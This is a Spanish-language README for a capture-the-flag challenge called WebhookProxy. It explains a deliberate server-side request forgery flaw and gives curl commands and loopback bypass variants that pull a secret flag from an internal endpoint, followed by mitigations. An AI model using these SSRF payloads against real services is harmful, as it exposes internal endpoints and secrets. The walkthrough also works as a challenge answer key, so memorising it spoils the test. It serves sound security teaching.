# WebhookProxy — hard-api-ssrf

| Campo       | Valor                          |
|-------------|-------------------------------|
| ID          | api-hard-ssrf                 |
| Nombre      | WebhookProxy                  |
| Categoría   | api                           |
| Dificultad  | hard                          |
| Puerto      | 80 (host: 8081 por defecto)   |
| Timeout     | 3600 s                        |

---

## Descripcion

Un servicio de pruebas de webhooks permite enviar una URL y el servidor realiza
una solicitud HTTP a esa URL, devolviendo el status y el cuerpo de la respuesta.
El endpoint `/internal/config` contiene la configuracion de produccion
(incluyendo la FLAG) pero solo responde a solicitudes provenientes de `127.0.0.1`.

---

## Vulnerabilidad

**Server-Side Request Forgery (SSRF)**

El endpoint `/api/webhook/test` acepta una URL arbitraria y realiza la solicitud
HTTP desde el servidor. La validacion de seguridad solo bloquea un conjunto
limitado de hosts:

```python
blocked = ['169.254.169.254', 'metadata.google', 'metadata.internal']
```

`127.0.0.1` y `localhost` no estan en la lista de bloqueo. Al enviar
`http://127.0.0.1/internal/config`, el servidor se consulta a si mismo.
Desde su propia perspectiva, `remote_addr` sera `127.0.0.1`, por lo que
el chequeo de IP interna pasa y devuelve la configuracion completa con la FLAG.

### Flujo del ataque

```
Atacante --> POST /api/webhook/test {"url": "http://127.0.0.1/internal/config"}
                                           |
                               [Servidor realiza la solicitud]
                                           |
                               GET /internal/config
                               remote_addr = 127.0.0.1  --> OK
                                           |
                               <-- {"secret_key": "CTF{...FLAG...}", ...}
                                           |
Atacante <-- {"status": 200, "body": "{\"secret_key\": \"CTF{...}\"}"}
```

---

## Pasos del ataque

### Paso 1 — Reconocimiento

Verificar el servicio:

```bash
curl -s http://localhost:8081/api/status
# {"status": "ok", "service": "WebhookProxy", "version": "2.1.4"}
```

Intentar acceso directo al endpoint interno (debe fallar):

```bash
curl -s http://localhost:8081/internal/config
# {"error": "Access restricted to internal network"}
```

### Paso 2 — Identificar el vector SSRF

La documentacion del servicio muestra `/api/webhook/test`. Al probar con una
URL externa se confirma que el servidor realiza solicitudes HTTP:

```bash
curl -s -X POST http://localhost:8081/api/webhook/test \
  -H "Content-Type: application/json" \
  -d '{"url": "https://httpbin.org/get"}'
```

### Paso 3 — Explotar SSRF hacia el endpoint interno

```bash
curl -s -X POST http://localhost:8081/api/webhook/test \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1/internal/config"}'
```

Respuesta esperada:

```json
{
  "status": 200,
  "body": "{\"environment\": \"production\", \"version\": \"2.1.4\", \"secret_key\": \"CTF{...FLAG...}\", \"db_host\": \"postgres.internal\", \"debug\": false}"
}
```

La `secret_key` en el body JSON contiene la FLAG.

### Variantes del bypass

```bash
# Con localhost
-d '{"url": "http://localhost/internal/config"}'

# Con IPv6 loopback
-d '{"url": "http://[::1]/internal/config"}'
```

---

## Script de solucion automatizado

```bash
python solve.py localhost 8081
```

---

## Como ejecutar el reto

```bash
FLAG="CTF{test_flag_123}" docker-compose up --build
# Acceder en http://localhost:8081
```

---

## Mitigacion (para referencia educativa)

- Implementar una allowlist estricta de hosts/IPs permitidos (en lugar de blocklist).
- Resolver el nombre DNS antes de comparar, para evitar bypass con nombres alternativos.
- No exponer endpoints sensibles en la misma interfaz de red que el servicio publico.
- Usar variables de entorno o servicios externos (AWS Secrets Manager, Vault) para secretos.
